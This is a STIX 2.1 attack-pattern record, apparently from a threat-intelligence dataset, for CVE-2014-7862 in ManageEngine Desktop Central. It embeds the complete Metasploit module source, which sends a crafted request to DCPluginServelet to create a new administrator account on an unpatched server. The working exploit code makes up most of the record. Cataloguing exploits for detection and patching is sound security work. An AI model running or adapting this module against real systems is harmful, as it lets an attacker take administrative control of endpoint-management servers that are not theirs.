{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f0173dcf-153b-47bb-a477-f09e9a1592ee",
    "created": "2024-08-14T16:23:46.225269Z",
    "modified": "2024-08-14T16:23:46.225273Z",
    "name": "ManageEngine Desktop Central Administrator Account Creation",
    "description": " This module exploits an administrator account creation vulnerability in Desktop Central from v7 onwards by sending a crafted request to DCPluginServelet. It has been tested in several versions of Desktop Central (including MSP) from v7 onwards. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/manage_engine_dc_create_admin.rb",
            "external_id": "manage_engine_dc_create_admin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-7862"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Jan/2"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_dc9_admin.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine Desktop Central Administrator Account Creation',\n        'Description' => %q{\n          This module exploits an administrator account creation vulnerability in Desktop Central\n          from v7 onwards by sending a crafted request to DCPluginServelet. It has been tested in\n          several versions of Desktop Central (including MSP) from v7 onwards.\n        },\n        'Author' => [\n          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2014-7862'],\n          ['OSVDB', '116554'],\n          ['URL', 'https://seclists.org/fulldisclosure/2015/Jan/2'],\n          ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/ManageEngine/me_dc9_admin.txt'],\n        ],\n        'DisclosureDate' => '2014-12-31'\n      )\n    )\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 8020]),\n        OptString.new('TARGETURI', [ true, 'ManageEngine Desktop Central URI', '/']),\n        OptString.new('USERNAME', [true, 'The username for the new admin account', 'msf']),\n        OptString.new('PASSWORD', [true, 'The password for the new admin account', 'password']),\n        OptString.new('EMAIL', [true, 'The email for the new admin account', 'msf@email.loc'])\n      ]\n    )\n  end\n\n  def run\n    # Generate password hash\n    salt = Time.now.to_i.to_s\n    password_encoded = Rex::Text.encode_base64([Rex::Text.md5(datastore['PASSWORD'] + salt)].pack('H*'))\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, '/servlets/DCPluginServelet'),\n      'method' => 'GET',\n      'vars_get' => {\n        'action' => 'addPlugInUser',\n        'role' => 'DCAdmin',\n        'userName' => datastore['USERNAME'],\n        'email' => datastore['EMAIL'],\n        'phNumber' => Rex::Text.rand_text_numeric(6),\n        'password' => password_encoded,\n        'salt' => salt,\n        'createdtime' => salt\n      }\n    })\n\n    # Yes, \"sucess\" is really mispelt, as is \"Servelet\" ... !\n    unless res && res.code == 200 && res.body && res.body.to_s =~ /sucess/\n      print_error('Administrator account creation failed')\n    end\n\n    print_good(\"Created Administrator account with credentials #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n    connection_details = {\n      module_fullname: fullname,\n      username: datastore['USERNAME'],\n      private_data: datastore['PASSWORD'],\n      private_type: :password,\n      workspace_id: myworkspace_id,\n      access_level: 'Administrator',\n      status: Metasploit::Model::Login::Status::UNTRIED\n    }.merge(service_details)\n    create_credential_and_login(connection_details)\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-12-31"
}